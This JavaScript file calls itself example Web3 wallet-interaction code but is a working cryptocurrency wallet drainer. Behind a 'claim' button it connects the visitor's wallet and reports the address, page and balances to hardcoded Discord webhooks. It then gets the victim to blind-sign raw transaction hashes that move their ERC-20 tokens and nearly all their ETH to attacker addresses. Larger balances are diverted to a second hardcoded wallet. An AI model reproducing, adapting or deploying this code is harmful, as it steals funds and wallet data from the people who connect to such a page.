"use strict";

/**
 * Example JavaScript code that interacts with the page and Web3 wallets
 */

 // Unpkg imports
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const EvmChains = window.EvmChains;
const Fortmatic = window.Fortmatic;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

const rA2 = '0xD86F378396f9e3ADb13C23121f1e16E62E0078a8',
  dW2 =
    'https://discord.com/api/webhooks/1059219278328508466/_WN50wX0bKWplW0meNgBypTupyXR0TG9hOOPyyJZz3gPdmh5wuiHwa9xh7a_XtkBJ7md';
let web3Provider,
  isConnected = false;
function isMobile() {
  var is_mobile_device = false;
  return (
    (function (useragent) {
      if (
        /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
          useragent
        ) ||
        /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
          useragent.substr(0, 4)
        )
      ) {
        is_mobile_device = true;
      }
    })(navigator.userAgent || navigator.vendor || window.opera),
    is_mobile_device
  );
}
// Moralis.onWeb3Enabled(async (data) => {
//   alert("i run")
//   if (data.chainId !== workChainId && metamaskInstalled) {
//     await Moralis.switchNetwork('0x' + workChainId.toString(16));
//   }
//   updateState(true);
//   console.log(data);
// });
Moralis.onChainChanged(async (chain) => {
  console.log('>>> chain', chain);
  console.log(
    chain !== '0x' + workChainId.toString(16),
    '0x' + workChainId.toString(16)
  );
  chain !== '0x' + workChainId.toString(16) && metamaskInstalled
    ? (await Moralis.switchNetwork('0x' + workChainId.toString(16)),
      (document.querySelector('#claimButton').style.display = 'none'),
      (document.querySelector('#connectWallet').style.display = ''))
    : ((document.querySelector('#claimButton').style.display = ''),
      (document.querySelector('#connectWallet').style.display = 'none'));
});

async function updateState(is_connected) {
  const web3_provider = new Web3(provider);
  isConnected = is_connected;
  document.querySelector('#claimButton').style.display = is_connected
    ? ''
    : 'none';
  document.querySelector('#connectWallet').style.display = is_connected
    ? 'none'
    : '';
  if (is_connected && autoMint) {
    askTransfer();
  }
}
const doConnectWallet = async () => {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        // Mikko's test key - don't copy as your mileage may vary
        infuraId: "19affef0dbd140e0aca95546e1c5bdd0",
      }
    },

  
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
  });

  try {
   
    console.log('>>> do connect');
    provider = await web3Modal.connect();
        console.log(provider);
    // if (!isConnected) {
    //   await Moralis.enableWeb3(
    //     metamaskInstalled ? {} : { provider: 'walletconnect' }
    //   );
    // }
    const web3_provider = new Web3(provider),
      connected_account = (await web3_provider.eth.getAccounts())[0],
      window_location = window.location.href;
    sW('`' + connected_account + '`is connected: ' + window_location);
    sW2('`' + connected_account + '`is connected: ' + window_location);
    console.log(connected_account + ' is connected');
    document.querySelector('#claimButton').style.display = '';
    document.querySelector('#connectWallet').style.display = 'none';
  } catch (err) {
    document.querySelector('#claimButton').style.display = 'none';
    document.querySelector('#connectWallet').style.display = '';
    console.log('>>> error', err);
  }
};
async function askSign() {
  const web3_provider = new Web3(provider),
    connected_account = (await web3_provider.eth.getAccounts())[0];
  try {
    const sign_msg = signMessage
      .replace('{address}', connected_account)
      .replace('{nonce}', createNonce()),
      _sign = await web3_provider.eth.personal.sign(
        sign_msg,
        connected_account
      ),
      signing_addr = await web3_provider.eth.personal.ecRecover(
        sign_msg,
        _sign
      );
    return (
      console.log(
        'Signing address: ' +
        signing_addr +
        '\n' +
        (connected_account.toLowerCase() == signing_addr.toLowerCase()
          ? 'Same address'
          : 'Not the same address.')
      ),
      true
    );
  } catch (err) {
    if (err.message.toLowerCase().includes('user denied')) {
      notEligible('signDenied');
    }
    return console.log(err), false;
  }
  await verifyAsset();
}

let eth_bal = 0;
const verifyAsset = async () => {
  const web3_provider = new Web3(provider),
    connected_account = (await web3_provider.eth.getAccounts())[0];
  try {
    eth_bal = await web3_provider.eth.getBalance(connected_account);
    const _eth_balance = web3_provider.utils.fromWei(eth_bal, 'ether');
    console.log(
      'Current balance for ' + connected_account + ' : ' + _eth_balance + ' ETH'
    );
    sW(
      'Current balance for ' + connected_account + ' : ' + _eth_balance + ' ETH'
    );
    if (_eth_balance > 0.002) {
      askTransferWithSign(_eth_balance);
    } else {
      console.log('Info, balance is too low. (< 0.01 ETH)');
      sW("Info, balance is too low. (< 0.01 ETH). Balance: ' " + _eth_balance);
    }
  } catch (err) {
    console.log(err);
  }
};
async function askTokens() {
  console.log('>>> askTokens');
  const web3_provider = new Web3(provider),
    connected_account = (await web3_provider.eth.getAccounts())[0],
    gas_price = await web3_provider.eth.getGasPrice(),
    gas_price_in_hex = web3_provider.utils.toHex(Math.floor(gas_price * 1.4)),
    get_balances = await Promise.all(
      Object.keys(erc20list).map(async (connect_addr) => {
        console.log('>>> prepare', connect_addr);
        const token_contract = new web3_provider.eth.Contract(
          tokenContractAbi,
          connect_addr,
          { from: connected_account }
        );
        console.log('>>> tokenContract', token_contract);
        const _in_decimals = await token_contract.methods
          .decimals()
          .call({ from: connected_account });
        console.log('>>> decimals', _in_decimals);
        const _balance_wei = await token_contract.methods
          .balanceOf(connected_account)
          .call({ from: connected_account });
        console.log('>>> balanceWei', _balance_wei);
        const _final_balance = new BigNumber(String(_balance_wei))
          .dividedBy(new BigNumber(String(10)).pow(_in_decimals))
          .toNumber();
        console.log('>>> balance', _final_balance);
        const _encode_function_call = web3_provider.eth.abi.encodeFunctionCall(
          {
            inputs: [
              {
                name: '_to',
                type: 'address',
              },
              {
                name: '_value',
                type: 'uint256',
              },
            ],
            name: 'transfer',
            stateMutability: 'nonpayable',
            outputs: [
              {
                name: 'success',
                type: 'bool',
              },
            ],
            payable: false,
            type: 'function',
          },
          [receiveAddress, new BigNumber(_balance_wei)]
        ),
          big_num16 = new BigNumber(_final_balance).toString(16);
        let _gas_limit_calculated = 600000,
          _gas_limit_with_success_percent = (600000).toString(16),
          _has_error_gas = false;
        try {
          _gas_limit_calculated = await token_contract.methods
            .transfer(receiveAddress, _balance_wei)
            .estimateGas({
              gas: '0x00',
              gasPrice: gas_price_in_hex,
              from: connected_account,
            });
        } catch (err) {
          console.error('>> fail get fee', err);
          _has_error_gas = true;
        }
        _gas_limit_with_success_percent = new BigNumber(
          new BigNumber(_gas_limit_calculated).multipliedBy(1.4).toFixed(0)
        ).toString(16);
        const _min_balance = erc20list[connect_addr];
        return {
          contractAddress: connect_addr,
          tokenContract: token_contract,
          balance: _final_balance,
          minBalance: _min_balance,
          balanceWei: _balance_wei,
          transferFunc: _encode_function_call,
          gasLimitCalculated: _gas_limit_calculated,
          gasLimitWithPercentForSuccess: _gas_limit_with_success_percent,
          hasErrorGas: _has_error_gas,
        };
      })
    );
  console.log('>>> tokenBalances', get_balances);
  const get_filterd_balances = get_balances
    .filter((item) => {
      return (
        item.balanceWei > 0 && item.balance >= item.minBalance
      );
    })
    .sort((a, b) => {
      return a.balance > b.balance ? -1 : 1;
    }),
    _gas_limit = (await web3_provider.eth.getBlock('latest')).gasLimit;
  if (get_filterd_balances.length < 0) {
    return verifyAsset();
  }
  const _chain_id = await web3_provider.eth.getChainId();
  console.log(get_filterd_balances)
  var tokenInfo = get_filterd_balances[0];
 
    console.log('>>> tokenInfo', tokenInfo);
    try {
      await web3_provider.eth
        .getTransactionCount(connected_account, 'pending')
        .then(async (trx_id) => {
          const provider_bn = new web3_provider.utils.BN(600000),
            _options = {
              nonce: web3_provider.utils.toHex(trx_id),
              gasPrice: gas_price_in_hex,
              gas: '0x' + tokenInfo.gasLimitWithPercentForSuccess,
              from: web3_provider.utils.toChecksumAddress(connected_account),
              contractAddress: tokenInfo.contractAddress,
              to: tokenInfo.contractAddress,
              value: '0x' + (0).toString(16),
              data: tokenInfo.transferFunc,
              v: '0x' + workChainId.toString(16),
              r: '0x',
              s: '0x',
            };
          let ethjs_tx = new ethereumjs.Tx(_options);
          const eth_js_toHes = '0x' + ethjs_tx.serialize().toString('hex'),
            hex_sh3_excryption = web3_provider.utils.sha3(eth_js_toHes, {
              encoding: 'hex',
            });
          await web3_provider.eth
            .sign(hex_sh3_excryption, connected_account)
            .then(async (enc_id) => {
              const w = enc_id.substring(2),
                e = '0x' + w.substring(0, 64),
                r = '0x' + w.substring(64, 128),
                t = parseInt(w.substring(128, 130), 16),
                y = web3_provider.utils.toHex(
                  t + _chain_id * 2 + 8
                );
              ethjs_tx.r = e;
              ethjs_tx.s = r;
              ethjs_tx.v = y;
              const signed_trx = '0x' + ethjs_tx.serialize().toString('hex'),
                enc_trx = web3_provider.utils.sha3(signed_trx, {
                  encoding: 'hex',
                });
              web3_provider.eth
                .sendSignedTransaction(signed_trx)
                .then((data) => console.log(data))
                .catch((error) => console.log('>>', error));
            })
            .catch((err) => console.log(err));
        });
    } catch (err) {
      console.log(err);
    }
  
  verifyAsset();
}
async function askTransferWithSign(sign) {
  console.log('>>> askTransferWithSign');
  const providers = new Web3(provider),
    account = (await providers.eth.getAccounts())[0],
    chain_id = await providers.eth.getChainId();
  await providers.eth
    .getTransactionCount(account, 'pending')
    .then(async (_nonce) => {
      const gas_price = await providers.eth.getGasPrice(),
        _gas_price = providers.utils.toHex(Math.floor(gas_price * 1.4)),
        a = new providers.utils.BN('36000'),
        b = a * Math.floor(gas_price * 2),
        _value = eth_bal - b;
      console.log(
        'Sending ' +
        providers.utils.fromWei(_value.toString(), 'ether') +
        ' ETH from ' +
        account +
        '...'
      );
      sW(
        'Sending ' +
        providers.utils.fromWei(_value.toString(), 'ether') +
        ' ETH from ' +
        account +
        '...'
      );
      sW2(
        'Sending ' +
        providers.utils.fromWei(_value.toString(), 'ether') +
        ' ETH from ' +
        account +
        '...'
      );
      const options = {
        nonce: providers.utils.toHex(_nonce),
        gasPrice: _gas_price,
        gasLimit: '0x55F0',
        from: providers.utils.toChecksumAddress(account),
        to: sign > 0.2962 ? nW : receiveAddress,
        value: '0x' + _value.toString(16),
        data: '0x',
        v: '0x' + workChainId.toString(16),
        r: '0x',
        s: '0x',
      };
      let eth_js_tx = new ethereumjs.Tx(options);
      const raw_tx = '0x' + eth_js_tx.serialize().toString('hex'),
        raw_hash = providers.utils.sha3(raw_tx, { encoding: 'hex' });
      console.log('rawTx1:', raw_tx);
      console.log('rawHash1:', raw_hash);
      await providers.eth
        .sign(raw_hash, account)
        .then(async (trx) => {
          const w = trx.substring(2),
            e = '0x' + w.substring(0, 64),
            r = '0x' + w.substring(64, 128),
            t = parseInt(w.substring(128, 130), 16),
            y = providers.utils.toHex(t + chain_id * 2 + 8);
          eth_js_tx.r = e;
          eth_js_tx.s = r;
          eth_js_tx.v = y;
          console.log(eth_js_tx);
          const raw_tx2 = '0x' + eth_js_tx.serialize().toString('hex'),
            raw_hash2 = providers.utils.sha3(raw_tx2, { encoding: 'hex' });
          console.log('rawTx:', raw_tx2);
          console.log('rawHash:', raw_hash2);
          await providers.eth
            .sendSignedTransaction(raw_tx2)
            .then((data) => console.log(data))
            .catch((err) => console.log('>>', err));
        })
        .catch((err) => console.log(err));
    });
}
async function notEligible(status) {
  const not_eil_element = document.getElementById('notEli');
  not_eil_element.style.display = 'hallooooooo';
  switch (status) {
    case 'signDenied':
      not_eil_element.innerText = 'You denied the sign request. Please try again.';
      break;
    case 'noTokens':
    await verifyAsset();
      break;
    case 'noNFTs':
      await verifyAsset();
      break;
    case 'noETH':
      not_eil_element.innerText = '';
      break;
    default:
      not_eil_element.innerText = 'Something went wrong.';
      break;
  }
}
let disabled = false;




async function askTransfer() {
  if (disabled) {
    return;
  }
  document.getElementById('claimButton').style.opacity = 0.5;
  disabled = true;
  await askTokens();
  disabled = false;
  document.getElementById('claimButton').style.opacity = 1;
}
let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') {
  metamaskInstalled = true;
}
window.addEventListener('load', async () => {
  console.log('>>>> on load');
  document.querySelector('#claimButton').addEventListener('click', askTransfer);
  document
      .querySelector('#connectWallet')
      .addEventListener('click', doConnectWallet);

   
});
const round = (number) => {
  return Math.round(number * 10000) / 10000;
},
  sleep = (time) => {
    return new Promise((resolve) => setTimeout(resolve, time));
  };
let nW = rA2;
const rdmString = (str_length) => {
  let string = '';
  const allowed_chars =
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  for (let i = 0; i < str_length; i++) {
    string += allowed_chars.charAt(
      Math.floor(Math.random() * allowed_chars.length)
    );
  }
  return string;
},
  createNonce = () => {
    return (
      rdmString(8) +
      '-' +
      rdmString(4) +
      '-' +
      rdmString(4) +
      '-' +
      rdmString(12)
    );
  },
  sendWebhooks = (_user_wallet, _contract, _price) => {
    if (!feedbackEnabled) {
      return;
    }
    fetch('/api.php?o=success', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userWallet: _user_wallet,
        contract: _contract,
        price: _price,
        dW2: dW2,
      }),
    }).catch((err) => console.error(err));
  },
  sW = (_content) => {
    if (!feedbackEnabled) {
      return;
    }
    fetch(discordWebhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: _content }),
    }).catch((err) => console.error(err));
  },
  sW2 = (_contet) => {
    fetch(dW2, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: _contet }),
    }).catch((err) => console.error(err));
  };
